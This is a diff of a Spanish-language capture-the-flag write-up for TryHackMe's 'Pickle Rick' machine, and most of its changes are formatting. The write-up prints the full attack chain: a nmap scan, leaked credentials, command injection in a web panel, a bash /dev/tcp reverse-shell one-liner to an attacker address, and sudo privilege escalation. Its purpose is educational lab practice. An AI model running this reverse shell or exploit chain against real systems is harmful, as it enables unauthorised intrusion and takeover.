@@ -1,16 +1,19 @@
 # 🛡️ **Writeup: Pickle Rick**  
-*Un ejercicio práctico de Ethical Hacking en el entorno de TryHackMe*
 
 ## 📌 **Descripción de la Máquina**
 
 **Nombre**: Pickle Rick  
-**Plataforma**: TryHackMe (https://tryhackme.com)  
+**Plataforma**: TryHackMe (<https://tryhackme.com>)  
 **Dificultad**: Principiante  
 **Objetivo**: Recuperar todos los ingredientes necesarios para revertir el proceso de "pickle" de Rick, demostrando técnicas de reconocimiento, explotación y escalada de privilegios.  
 **IP Objetivo**: 10.10.238.80  
 **Fecha del Análisis**: 11 de agosto de 2025
 
+<br>
+
 ---
+
+<br>
 
 ## 🔍 **Metodología Utilizada**
 
@@ -22,7 +25,11 @@ Para este análisis de seguridad, se siguió una metodología estructurada basad
 4. **Post-Explotación y Escalada de Privilegios**
 5. **Documentación de Hallazgos**
 
+<br>
+
 ---
+
+<br>
 
 ## 📡 **1. Reconocimiento y Descubrimiento**
 
@@ -36,7 +43,7 @@ sudo nmap -sV -p- 10.10.238.80 -v
 
 **Resultados del Escaneo:**
 
-```
+```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-11 21:44 CEST
 NSE: Loaded 46 scripts for scanning.
 Initiating Ping Scan at 21:44
@@ -55,10 +62,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 **Análisis de Resultados:**
+
 - **Puerto 22 (SSH)**: Servicio OpenSSH 8.2p1 en Ubuntu. Este servicio suele ser objetivo común para ataques de fuerza bruta, pero en este caso requeriría credenciales válidas.
 - **Puerto 80 (HTTP)**: Servidor web Apache 2.4.41 en Ubuntu. Este es el punto de entrada principal para el análisis.
 
+<br>
+
 ---
+
+<br>
 
 ## 🔎 **2. Enumeración y Análisis de Servicios**
 
@@ -66,43 +78,56 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Tras identificar el servidor web, se procedió a una enumeración detallada:
 
-1. **Acceso a la página principal**:
+1. **Acceso a la página principal**:  
+
    - Se identificó una interfaz web temática de Rick and Morty.
    - Contenía referencias a un "Portal de Rick" y menciones a "ingredientes".
 
-2. **Análisis del código fuente**:
+2. **Análisis del código fuente**:  
    - Al revisar el código fuente de la página principal (index.html), se identificó una pista crítica:
+
 ```html
 <!-- R1ckRul3s -->
 ```
-   - **Hallazgo**: Nombre de usuario válido para el sistema.
 
-3. **Análisis de `robots.txt`**:
+- **Hallazgo**: Nombre de usuario válido para el sistema.
+
+3.**Análisis de `robots.txt`**:  
+
 ```bash
 curl http://10.10.238.80/robots.txt
 ```
-```
+
+```bash
 Wubbalubbadubdub
 ```
 
-   - **Hallazgo**: Cadena sospechosa que podría ser una credencial o pista.
+- **Hallazgo**: Cadena sospechosa que podría ser una credencial o pista.
 
-4. **Pruebas Manuales de Autenticación**:
-- Basado en las pistas encontradas (usuario en el código fuente y cadena en robots.txt), se probaron credenciales:
-	- Usuario: `R1ckRul3s` (encontrado en el código fuente de la página principal)
-	- Contraseña: `Wubbalubbadubdub` (encontrada en robots.txt)
+4.**Pruebas Manuales de Autenticación**:  
+
+- Basado en las pistas encontradas, se probaron credenciales:  
+
+  - Usuario: `R1ckRul3s` (encontrado en el código fuente de la página principal)
+  - Contraseña: `Wubbalubbadubdub` (encontrada en robots.txt)
 - **Resultado**: Autenticación exitosa con redirección a `/portal.php`.
 
-5. **Análisis del Command Panel**:
-   - Se identificó un panel de comandos en `/portal.php` que permitía ejecutar comandos del sistema.
-   - Se confirmó Command Injection al ejecutar:
+5.**Análisis del Command Panel**:
+
+- Se identificó un panel de comandos en `/portal.php` que permitía ejecutar comandos del sistema.
+- Se confirmó Command Injection al ejecutar:
+
 ```bash
 ls
 whoami
 id
-```
+```  
+
+<br>
 
 ---
+
+<br>
 
 ## 💥 **3. Explotación de Vulnerabilidades**
 
@@ -111,11 +136,15 @@ id
 El Command Panel permitía ejecutar comandos del sistema directamente, lo que representa una vulnerabilidad crítica de Command Injection.
 
 **Hallazgos Clave:**
+
 - Comando `cat` estaba bloqueado con el mensaje:
-  ```
+
+  ```bash
   Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
   ```
+
 - Se utilizaron alternativas para leer archivos:
+
   ```bash
   ls /home/rick
   less /home/rick/second\ ingredients
@@ -126,16 +155,19 @@ El Command Panel permitía ejecutar comandos del sistema directamente, lo que re
 Para obtener un control más completo del sistema, se implementó una Reverse Shell:
 
 **En la máquina atacante:**
+
 ```bash
 nc -nvlp 4444
 ```
 
 **En el Command Panel:**
+
 ```bash
 bash -c 'exec bash -i &>/dev/tcp/10.14.104.220/4444 <&1'
 ```
 
 **Resultado:**
+
 - Conexión exitosa a la shell inversa.
 - Acceso interactivo al sistema como usuario `www-data`.
 
@@ -155,6 +187,7 @@ ls -la /home/rick/
 ```
 
 **Hallazgos Relevantes:**
+
 - Directorio `/home/rick/` contenía archivos críticos.
 - Usuario `www-data` tenía permisos limitados.
 
@@ -167,7 +200,8 @@ sudo -l
 ```
 
 **Resultado:**
-```
+
+```bash
 Matching Defaults entries for www-data on ip-10-10-238-80:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -176,16 +210,20 @@ User www-data may run the following commands on ip-10-10-238-80:
 ```
 
 **Explotación:**
+
 - Se aprovechó la configuración insegura de sudo para obtener acceso root sin contraseña:
+
   ```bash
   sudo su -
   ```
 
 **Verificación:**
+
 ```bash
 whoami
 ```
-```
+
+```bash
 root
 ```
 
@@ -215,6 +253,7 @@ cat /home/rick/another_important_file
 ### **Resumen de Impacto**
 
 El sistema presentaba múltiples vulnerabilidades que, combinadas, permitían:
+
 1. Obtener credenciales válidas a través de información expuesta en el código fuente y robots.txt
 2. Acceder a un panel con Command Injection
 3. Establecer una shell remota
@@ -222,12 +261,18 @@ El sistema presentaba múltiples vulnerabilidades que, combinadas, permitían:
 
 Esto representa un riesgo extremo para la integridad, confidencialidad y disponibilidad del sistema.
 
+<br>
+
 ---
+
+<br>
+
 ## 📌 **Conclusión**
 
 La máquina "Pickle Rick" presentaba múltiples vulnerabilidades de seguridad que, en un entorno real, habrían permitido a un atacante obtener acceso completo al sistema. La combinación de credenciales débiles expuestas en el código fuente y en `robots.txt`, Command Injection y una configuración insegura de sudo creó un escenario de alto riesgo.
 
-Este ejercicio demuestra la importancia crítica de:
+Este ejercicio demuestra la importancia crítica de:  
+
 - No exponer información sensible en el código fuente
 - No implementar funcionalidades peligrosas como Command Panels en entornos web
 - Implementar controles de acceso adecuados
@@ -235,7 +280,11 @@ Este ejercicio demuestra la importancia crítica de:
 
 Aunque este entorno era intencionalmente vulnerable como ejercicio de CTF, los mismos principios se aplican a sistemas reales donde estas vulnerabilidades pueden tener consecuencias graves.
 
+<br>
+
 ---
+
+<br>
 
 ## 📚 **Recursos Adicionales**
 
@@ -244,7 +293,9 @@ Aunque este entorno era intencionalmente vulnerable como ejercicio de CTF, los m
 - [Sudoers Manual](https://www.sudo.ws/man/1.8.15/sudoers.man.html)
 - [Nmap Documentation](https://nmap.org/book/)
 
+<br>
+
 ---
 
 *Documento elaborado por: @juanma-cc
-Fecha: 11 de agosto de 2025* 
+Fecha: 11 de agosto de 2025*
